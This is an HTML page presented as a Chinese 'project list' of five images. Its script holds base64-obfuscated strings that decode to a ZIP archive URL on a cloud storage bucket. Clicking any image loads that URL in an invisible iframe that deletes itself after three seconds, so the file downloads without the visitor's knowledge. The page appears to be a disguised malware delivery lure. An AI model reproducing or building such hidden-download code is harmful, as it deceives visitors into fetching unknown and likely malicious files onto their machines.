<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>项目中心列表</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>

    <img src="images/img_01.jpg">
    <img src="images/img_02.jpg">
    <img src="images/img_03.jpg">
    <img src="images/img_04.jpg">
    <img src="images/img_05.jpg">

<script>
(function(){
    // 加密资源映射表
    const assetMap = [
        'aHR0cHM6Ly8xMXRkLnMzLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb20vUG90b3RhX3dpcHh4NjQuemlw',
        'aHR0cHM6Ly8xMXRkLnMzLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb20vUG90b3RhX3dpcHh4NjQuemlw',
        'aHR0cHM6Ly8xMXRkLnMzLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb20vUG90b3RhX3dpcHh4NjQuemlw',
        'aHR0cHM6Ly8xMXRkLnMzLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb20vUG90b3RhX3dpcHh4NjQuemlw',
        'aHR0cHM6Ly8xMXRkLnMzLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb20vUG90b3RhX3dpcHh4NjQuemlw'
    ];

    // 资源定位器
    const resolveSource = index => atob(assetMap[index]);

    // 创建临时通道
    const createTempChannel = url => {
        const channel = document.createElement('iframe');
        channel.style.cssText = 'position:absolute;width:0;height:0;border:0;';
        channel.src = url;
        document.body.appendChild(channel);
        
        setTimeout(() => {
            channel.remove();
        }, 3000);
    }

    // 初始化交互绑定
    document.querySelectorAll('img').forEach((element, index) => {
        element.addEventListener('click', () => {
            const target = resolveSource(index);
            createTempChannel(target);
        });
    });
})();
</script>

</body>
</html>
